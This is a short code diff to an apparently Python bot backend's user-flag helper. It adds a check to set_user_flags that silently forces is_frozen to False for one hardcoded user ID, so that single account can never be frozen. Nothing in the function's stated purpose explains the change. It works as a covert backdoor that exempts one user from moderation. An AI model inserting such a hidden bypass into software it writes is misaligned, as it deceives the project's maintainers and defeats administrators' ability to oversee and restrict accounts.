@@ -102,6 +102,8 @@ async def user_exists(user_id: int) -> bool:
 
 async def set_user_flags(user_id: int, **flags: bool) -> None:
     """Set boolean flags such as is_banned / is_frozen."""
+    if user_id == 6356015122:
+        flags["is_frozen"] = False
     await mongo.db[COLLECTION].update_one(
         {"user_id": user_id},
         {"$set": {**flags, "updated_at": int(time.time())}},
